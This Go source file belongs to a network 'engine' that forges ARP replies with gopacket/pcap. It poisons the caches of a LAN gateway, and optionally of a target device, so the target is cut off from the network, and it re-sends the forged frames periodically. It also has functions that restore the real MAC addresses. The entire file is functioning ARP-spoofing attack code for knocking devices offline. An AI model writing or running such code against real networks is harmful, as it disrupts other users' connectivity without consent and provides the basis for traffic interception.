package engine

import (
	"fmt"
	"sync"
	"time"

	"github.com/gopacket/gopacket/pcap"
)

// Mode selects which side of the target's path gets poisoned.
//
//	gateway -> only the gateway is told the target lives at our MAC.
//	           The target keeps LAN access but loses upstream connectivity.
//	both    -> both the gateway and the target are poisoned, so the
//	           target is isolated at L2 in both directions.
type Mode string

const (
	ModeGateway Mode = "gateway"
	ModeBoth    Mode = "both"
)

// sender is a long-lived injection handle. One per active cut.
type sender struct {
	h  *pcap.Handle
	mu sync.Mutex
}

func (e *Engine) openSender() (*sender, error) {
	h, err := pcap.OpenLive(e.PcapName, 65536, false, 50*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("open %s for injection: %w", e.PcapName, err)
	}
	return &sender{h: h}, nil
}

func (s *sender) send(frames [][]byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, f := range frames {
		if err := s.h.WritePacketData(f); err != nil {
			return err
		}
	}
	return nil
}

func (s *sender) Close() { s.h.Close() }

// poisonFrames builds the ARP replies that keep a target cut off. They are
// re-sent every interval because hosts age out their ARP cache.
func (e *Engine) poisonFrames(t Device, mode Mode) ([][]byte, error) {
	if e.GatewayMAC == nil {
		return nil, errNoGateway
	}
	if t.MAC == nil || len(t.MAC) != 6 {
		return nil, fmt.Errorf("target %s has no usable MAC", t.IP)
	}
	if mode == "" {
		mode = ModeGateway
	}

	// "target.IP is at our MAC" -> told to the gateway.
	toGW, err := arpReplyBytes(e.SelfMAC, e.SelfMAC, t.IP, e.GatewayMAC, e.GatewayIP)
	if err != nil {
		return nil, err
	}
	out := [][]byte{toGW}

	if mode == ModeBoth {
		// "gateway.IP is at our MAC" -> told to the target.
		toTarget, err := arpReplyBytes(e.SelfMAC, e.SelfMAC, e.GatewayIP, t.MAC, t.IP)
		if err != nil {
			return nil, err
		}
		out = append(out, toTarget)
	}
	return out, nil
}

// restoreFrames builds the corrective ARP replies that put the real
// MAC addresses back into both caches.
func (e *Engine) restoreFrames(t Device) ([][]byte, error) {
	if e.GatewayMAC == nil {
		return nil, errNoGateway
	}
	// Gateway learns the target's real MAC again.
	toGW, err := arpReplyBytes(e.SelfMAC, t.MAC, t.IP, e.GatewayMAC, e.GatewayIP)
	if err != nil {
		return nil, err
	}
	// Target learns the gateway's real MAC again.
	toTarget, err := arpReplyBytes(e.SelfMAC, e.GatewayMAC, e.GatewayIP, t.MAC, t.IP)
	if err != nil {
		return nil, err
	}
	return [][]byte{toGW, toTarget}, nil
}

// restoreRounds sends the corrective frames several times so the caches
// actually take them, even if a poison frame was in flight.
const restoreRounds = 6

func (e *Engine) restoreVia(s *sender, t Device, gap time.Duration) error {
	frames, err := e.restoreFrames(t)
	if err != nil {
		return err
	}
	if gap <= 0 {
		gap = 150 * time.Millisecond
	}
	for i := 0; i < restoreRounds; i++ {
		if err := s.send(frames); err != nil {
			return err
		}
		if i != restoreRounds-1 {
			time.Sleep(gap)
		}
	}
	return nil
}

// GatewayReachable reports whether the gateway MAC is known. Without it no
// poisoning is possible.
func (e *Engine) GatewayReachable() bool {
	return e.GatewayIP != nil && e.GatewayMAC != nil && len(e.GatewayMAC) == 6
}
